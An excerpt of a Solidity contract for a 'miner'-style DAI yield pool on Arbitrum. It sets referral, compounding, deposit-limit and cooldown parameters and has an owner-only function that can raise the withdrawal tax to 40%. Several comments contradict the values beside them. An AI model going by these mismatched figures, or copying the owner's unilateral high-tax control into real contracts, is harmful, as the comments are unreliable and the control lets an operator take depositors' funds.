...
contract DAIpool {
    ...
    //address erctoken = 0x5baab8309BF78a9D2a0f39C6222679af93D4dd87; /** USDC Arbitrum Testnet **/
    address erctoken = 0xDA10009cBd5D07dd0CeCc66161FC93D7c9000da1; /** DAI Arbitrum One Main **/
    uint256 public EGGS_TO_HIRE_1MINERS = 2592000; // 3%
    uint256 public PERCENTS_DIVIDER = 1000;
    uint256 public REFERRAL = 100;
    uint256 public TAX = 6;                                         // 3% TAX
    uint256 public MARKET_EGGS_DIVISOR = 2; // 50%
    uint256 public MARKET_EGGS_DIVISOR_SELL = 1; // 100%

    uint256 public MIN_INVEST_LIMIT = 1 * 1e18; /** 100 USDC  **/
    uint256 public WALLET_DEPOSIT_LIMIT = 10000 * 1e18; /** 10000 USDC  **/

	uint256 public COMPOUND_BONUS = 10; /** 1% **/
	uint256 public COMPOUND_BONUS_MAX_TIMES = 3; /** 3 times **/
	...
	uint256 public WITHDRAW_COOLDOWN = 3 * 60 * 60; /** 3 hours  **/
    ...
    function SET_WITHDRAWAL_TAX(uint256 value) external {
        require(msg.sender == owner, "Admin use only.");
        require(value <= 400); /** Max Tax is 40% or lower **/
